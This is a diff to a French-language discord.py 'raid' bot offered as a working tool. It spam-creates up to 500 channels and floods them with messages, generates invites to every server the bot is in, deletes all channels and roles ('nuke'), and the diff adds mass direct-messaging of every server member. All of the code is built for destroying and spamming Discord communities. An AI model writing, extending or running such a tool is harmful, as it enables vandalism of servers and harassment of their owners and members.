@@ -1,7 +1,10 @@
 import discord
 import asyncio
 
-client = discord.Client()
+intents = discord.Intents.default()
+intents.members = True
+
+client = discord.Client(intents=intents)
 
 async def spam_channels(guild, channel_name, message, num_channels, repeat_count):
     print(f"Création de {num_channels} salons '{channel_name}' dans le serveur {guild.name}")
@@ -10,24 +13,24 @@ async def spam_channels(guild, channel_name, message, num_channels, repeat_count
     for i in range(num_channels):
         tasks.append(create_and_send_message(guild, channel_name, message, i+1, repeat_count))
     
-    await asyncio.gather(*tasks)  # Attendre que toutes les coroutines soient terminées
+    await asyncio.gather(*tasks)
     print(f"{num_channels} salons créés avec succès dans le serveur {guild.name}")
 
 async def create_and_send_message(guild, channel_name, message, index, repeat_count):
     channel = await guild.create_text_channel(f"{channel_name}-{index}")
     print(f"Salon '{channel.name}' créé dans le serveur {guild.name}")
 
-    if message.strip():  # Vérifie si le message n'est pas vide
+    if message.strip():
         for _ in range(repeat_count):
             await channel.send(message)
-            await asyncio.sleep(0.5)  # Attendre 0.5 secondes entre chaque envoi
+            await asyncio.sleep(0.5)
     else:
         print(f"Message vide pour le salon '{channel.name}', aucun message envoyé.")
 
 async def list_servers():
     print("Affichage des serveurs et invitations :")
     for guild in client.guilds:
-        if guild.text_channels:  # Vérifie s'il y a des salons textuels
+        if guild.text_channels:
             invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
             print(f"Nom du serveur : {guild.name}")
             print(f"ID du serveur : {guild.id}")
@@ -40,7 +43,6 @@ async def list_servers():
 async def nuke_server(guild):
     print(f"En train de nettoyer le serveur {guild.name} ...")
 
-    # Effacer tous les salons textuels
     for channel in guild.text_channels:
         try:
             await channel.delete()
@@ -49,7 +51,6 @@ async def nuke_server(guild):
         except Exception as e:
             print(f"Une erreur s'est produite lors de la suppression du salon {channel.name} : {e}")
 
-    # Effacer tous les rôles
     for role in guild.roles:
         try:
             await role.delete()
@@ -60,13 +61,27 @@ async def nuke_server(guild):
 
     print(f"Nettoyage terminé pour le serveur {guild.name}.")
 
+async def dm_all_members(guild, message):
+    print(f"Envoi de messages directs à tous les membres du serveur {guild.name}")
+    for member in guild.members:
+        if member.bot:
+            continue
+        try:
+            await member.send(message)
+            print(f"Message envoyé à {member.name}")
+        except discord.Forbidden:
+            print(f"Impossible d'envoyer un message à {member.name}, permission refusée.")
+        except Exception as e:
+            print(f"Une erreur s'est produite lors de l'envoi d'un message à {member.name} : {e}")
+
 async def main_menu():
     while True:
         print("\nBienvenue ! Voici les options disponibles :")
         print("1. Raid serveur")
         print("2. Liste des serveurs et invitations")
         print("3. Nuke le serveur (efface tous les salons et rôles)")
-        choice = input("Entrez votre choix (1, 2 ou 3) : ")
+        print("4. Mass Dm Membre D'un Serveur")
+        choice = input("Entrez votre choix (1, 2, 3 ou 4) : ")
 
         if choice == '1':
             guild_id_input = input("Entrez l'ID du serveur où créer les salons : ")
@@ -80,7 +95,7 @@ async def main_menu():
             channel_name = input("Entrez le nom du salon à créer : ")
             message = input("Entrez le message à envoyer dans chaque salon : ")
             
-            num_channels_input = input("Combien de salons souhaitez-vous créer ( Maximum 500 ) ? : ")
+            num_channels_input = input("Combien de salons souhaitez-vous créer (Maximum 500) ? : ")
             num_channels = min(int(num_channels_input) if num_channels_input.strip() else 1, 500)
             
             repeat_count_input = input("Combien de fois envoyer le message dans chaque salon ? : ")
@@ -120,8 +135,20 @@ async def main_menu():
             
             await nuke_server(guild)
             print("Retour au menu principal...")
+        elif choice == '4':
+            guild_id_input = input("Entrez l'ID du serveur où envoyer des DM : ")
+            guild_id = int(guild_id_input) if guild_id_input.strip() else None
+            
+            guild = client.get_guild(guild_id)
+            if guild is None:
+                print(f"Impossible de trouver le serveur avec l'ID {guild_id}")
+                continue
+
+            message = input("Entrez le message à envoyer à tous les membres : ")
+            await dm_all_members(guild, message)
+            print("Retour au menu principal...")
         else:
-            print("Choix invalide. Veuillez entrer 1, 2 ou 3.")
+            print("Choix invalide. Veuillez entrer 1, 2, 3 ou 4.")
 
 @client.event
 async def on_ready():
